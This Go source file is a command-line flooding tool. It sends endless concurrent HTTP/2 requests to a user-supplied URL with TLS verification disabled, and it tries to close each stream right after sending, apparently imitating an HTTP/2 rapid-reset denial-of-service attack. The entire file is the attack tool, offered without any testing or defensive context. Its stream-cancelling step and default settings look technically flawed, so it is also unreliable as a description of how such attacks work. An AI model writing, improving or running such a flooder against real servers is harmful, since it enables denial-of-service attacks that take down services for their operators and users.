package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"golang.org/x/net/http2"
)

var (
	url   string
	limit int
)

func init() {
	flag.StringVar(&url, "url", "", "URL to send requests to")
	flag.IntVar(&limit, "limit", 0, "Limit on number of concurrent goroutines (0 for no limit)")
	flag.Parse()
	if url == "" {
		fmt.Println("Please specify a URL using the -url flag.")
		os.Exit(1)
	}
}

func worker(ctx context.Context, wg *sync.WaitGroup, jobs chan struct{}) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case <-jobs:
			sendRequest(ctx)
		}
	}
}

func sendRequest(ctx context.Context) {
	// Create an HTTP client with HTTP/2 support
	client := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Create a new request
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		// fmt.Println("Failed to create request:", err)
		return
	}

	// Send the request in a separate goroutine to allow closing the stream immediately
	go func() {
		_, err := client.Do(req)
		if err != nil {
			// fmt.Println("Failed to send request:", err)
		}
	}()

	// Attempt to close the stream immediately
	if h2Transport, ok := client.Transport.(*http2.Transport); ok {
		h2Transport.CloseIdleConnections()
	}
}

func main() {
	var wg sync.WaitGroup

	// Create a context that we can cancel
	ctx, cancel := context.WithCancel(context.Background())

	// Catch interrupt signal for graceful shutdown
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("Stopping...")
		cancel() // Cancel the context to stop all goroutines
	}()

	// Create a channel to send work items to the workers
	jobs := make(chan struct{}, limit) // Buffered channel with capacity equal to the limit

	// Create worker goroutines
	for i := 0; i < limit; i++ {
		wg.Add(1)
		go worker(ctx, &wg, jobs)
	}

	// Infinite loop to continuously send requests
	for {
		select {
		case <-ctx.Done():
			close(jobs) // Close the jobs channel to signal workers to exit
			wg.Wait()   // Wait for all workers to finish
			fmt.Println("All workers finished. Exiting.")
			return
		default:
			// Only send a new work item if there's room in the jobs channel
			select {
			case jobs <- struct{}{}: // Send a new work item to the workers
			default:
				// No room in the jobs channel; wait for a worker to become available
			}
		}
	}
}
